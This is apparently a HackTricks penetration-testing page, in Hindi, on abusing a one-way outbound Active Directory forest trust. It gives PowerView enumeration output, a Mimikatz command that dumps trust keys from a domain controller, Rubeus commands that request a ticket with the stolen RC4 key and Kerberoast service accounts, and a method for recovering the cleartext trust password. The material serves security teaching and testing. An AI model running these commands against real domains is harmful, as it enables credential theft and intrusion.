# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

इस परिदृश्य में **आपका डोमेन** कुछ **विशेषाधिकार** को **विभिन्न डोमेन** से प्रिंसिपल को **विश्वास** कर रहा है।

## Enumeration

### Outbound Trust
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

एक सुरक्षा कमजोरी तब होती है जब दो डोमेन के बीच एक ट्रस्ट संबंध स्थापित किया जाता है, जिसे यहाँ डोमेन **A** और डोमेन **B** के रूप में पहचाना गया है, जहाँ डोमेन **B** अपने ट्रस्ट को डोमेन **A** तक बढ़ाता है। इस सेटअप में, डोमेन **B** के लिए डोमेन **A** में एक विशेष खाता बनाया जाता है, जो दोनों डोमेन के बीच प्रमाणीकरण प्रक्रिया में महत्वपूर्ण भूमिका निभाता है। यह खाता, जो डोमेन **B** से संबंधित है, डोमेन के बीच सेवाओं तक पहुँचने के लिए टिकटों को एन्क्रिप्ट करने के लिए उपयोग किया जाता है।

यहाँ समझने के लिए महत्वपूर्ण पहलू यह है कि इस विशेष खाते का पासवर्ड और हैश डोमेन **A** में एक डोमेन कंट्रोलर से एक कमांड लाइन टूल का उपयोग करके निकाला जा सकता है। इस क्रिया को करने के लिए कमांड है:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
यह निष्कर्षण संभव है क्योंकि खाता, जिसका नाम के बाद **$** है, सक्रिय है और डोमेन **A** के "Domain Users" समूह का सदस्य है, जिससे इस समूह से संबंधित अनुमतियाँ विरासत में मिलती हैं। यह व्यक्तियों को इस खाते के क्रेडेंशियल्स का उपयोग करके डोमेन **A** के खिलाफ प्रमाणीकरण करने की अनुमति देता है।

**चेतावनी:** इस स्थिति का लाभ उठाकर डोमेन **A** में एक उपयोगकर्ता के रूप में एक पैर जमाना संभव है, हालांकि सीमित अनुमतियों के साथ। हालाँकि, यह पहुँच डोमेन **A** पर एन्यूमरेशन करने के लिए पर्याप्त है।

एक परिदृश्य में जहाँ `ext.local` विश्वसनीय डोमेन है और `root.local` विश्वसनीय डोमेन है, `root.local` के भीतर `EXT$` नाम का एक उपयोगकर्ता खाता बनाया जाएगा। विशिष्ट उपकरणों के माध्यम से, Kerberos ट्रस्ट कुंजियों को डंप करना संभव है, जो `root.local` में `EXT$` के क्रेडेंशियल्स को प्रकट करता है। इसे प्राप्त करने के लिए आदेश है:
```bash
lsadump::trust /patch
```
इसके बाद, कोई निकाले गए RC4 कुंजी का उपयोग करके `root.local\EXT$` के रूप में `root.local` के भीतर प्रमाणित हो सकता है, एक अन्य उपकरण कमांड का उपयोग करते हुए:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
यह प्रमाणीकरण चरण `root.local` के भीतर सेवाओं को सूचीबद्ध करने और यहां तक कि शोषण करने की संभावना खोलता है, जैसे कि सेवा खाता क्रेडेंशियल्स निकालने के लिए Kerberoast हमले का प्रदर्शन करना:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### स्पष्ट पाठ ट्रस्ट पासवर्ड एकत्र करना

पिछले प्रवाह में **स्पष्ट पाठ पासवर्ड** के बजाय ट्रस्ट हैश का उपयोग किया गया था (जो कि **mimikatz द्वारा भी डंप किया गया था**).

स्पष्ट पाठ पासवर्ड को mimikatz से \[ CLEAR ] आउटपुट को हेक्साडेसिमल में परिवर्तित करके और नल बाइट्स ‘\x00’ को हटाकर प्राप्त किया जा सकता है:

![](<../../images/image (938).png>)

कभी-कभी ट्रस्ट संबंध बनाते समय, उपयोगकर्ता द्वारा ट्रस्ट के लिए एक पासवर्ड टाइप करना आवश्यक होता है। इस प्रदर्शन में, कुंजी मूल ट्रस्ट पासवर्ड है और इसलिए मानव-पठनीय है। जैसे-जैसे कुंजी चक्रित होती है (30 दिन), स्पष्ट पाठ मानव-पठनीय नहीं होगा लेकिन तकनीकी रूप से अभी भी उपयोगी रहेगा।

स्पष्ट पाठ पासवर्ड का उपयोग ट्रस्ट खाते के रूप में नियमित प्रमाणीकरण करने के लिए किया जा सकता है, जो ट्रस्ट खाते के केर्बेरोस गुप्त कुंजी का उपयोग करके TGT का अनुरोध करने का एक विकल्प है। यहाँ, ext.local से root.local के लिए Domain Admins के सदस्यों का प्रश्न पूछना:

![](<../../images/image (792).png>)

## संदर्भ

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
